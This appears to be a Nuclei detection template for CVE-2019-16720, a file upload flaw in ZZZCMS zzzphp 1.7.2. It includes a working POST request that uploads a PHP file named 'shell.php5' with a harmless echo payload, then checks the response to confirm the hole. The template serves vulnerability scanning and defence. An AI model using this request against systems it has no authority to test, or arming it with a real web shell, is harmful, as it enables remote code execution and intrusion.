id: CVE-2019-16720

info:
  name: ZZZCMS zzzphp v1.7.2 File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: ZZZCMS zzzphp v1.7.2 does not properly restrict file upload in plugins/ueditor/php/controller.php?upfolder=news&action=catchimage, allowing uploads of .htaccess or .php5 files.
  impact: |
    Successful exploitation could lead to remote code execution or unauthorized access to the system.
  remediation: |
    Upgrade to a patched version of ZZZCMS zzzphp v1.7.3 or later to mitigate the vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-16720
    cwe-id: CWE-434
    epss-score: 0.0009
    epss-percentile: 0.39815
    cpe: cpe:2.3:a:zzzcms:zzzphp:1.7.2:*:*:*:*:*:*:*
  metadata:
    vendor: zzzcms
    product: zzzphp

http:
  - method: POST
    path:
      - "{{BaseURL}}/plugins/ueditor/php/controller.php?upfolder=news&action=catchimage"

    headers:
      Content-Type: multipart/form-data

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="shell.php5"
      Content-Type: application/x-php

      <?php echo '<p>Hello from Hacker!</p>'; ?>
      ------WebKitFormBoundary--
    matchers:
      - type: word
        words:
          - "Hello from Hacker!"
        part: body
